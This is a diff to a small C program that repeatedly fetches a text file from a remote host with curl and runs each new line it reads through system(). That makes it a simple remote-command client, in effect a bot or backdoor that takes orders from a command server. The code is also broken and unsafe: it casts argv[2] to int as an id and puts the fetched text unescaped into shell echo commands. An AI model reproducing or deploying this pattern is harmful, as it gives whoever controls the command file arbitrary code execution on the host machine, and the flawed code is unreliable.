@@ -11,14 +11,16 @@ char * getCommand (char * curlCommand);
 
 int main (int argc, char **argv)
 {
-  char buff[256];
+  char printBuff[256];
   char curlCommand[256];
   char * newCommand = NULL;
 
-  system("echo ':)'");
+  int id = argc > 1 ? (int)argv[2] : 0;
+  sprintf(printBuff, "echo 'Listening to commands posted to file %d'", id);
+  system(printBuff);
 
   // get current listed commands and store in command file
-  sprintf(curlCommand, "curl %s%d.txt > command_read.txt", COMMAND_LOC, (int)argv[2]);
+  sprintf(curlCommand, "curl %s%d.txt > command_read.txt", COMMAND_LOC, id);
 
   long unsigned int i;
 
@@ -26,6 +28,7 @@ int main (int argc, char **argv)
     newCommand = getCommand(curlCommand);
     if (newCommand != NULL) {
       system(newCommand);
+      system("echo ");
     }
     for (i = 0; i < TIME; i++) {}
   }
@@ -48,11 +51,13 @@ char * getCommand (char * curlCommand)
   fp = fopen("command_read.txt", "r");
   fgets(current, 255, (FILE*)fp);
   fclose(fp);
-  sprintf(buff, "echo command:'%s'", current);
-  system(buff);
   /* fclose(fp); */
   // compare with previous command
   if (previous == NULL || strcmp(current, previous) != 0) {
+    // print command
+    sprintf(buff, "echo command: '%s'", current);
+    system("echo ");
+    system(buff);
     // is new command, set previous as self
     previous = strdup(current);
     // return pointer to command
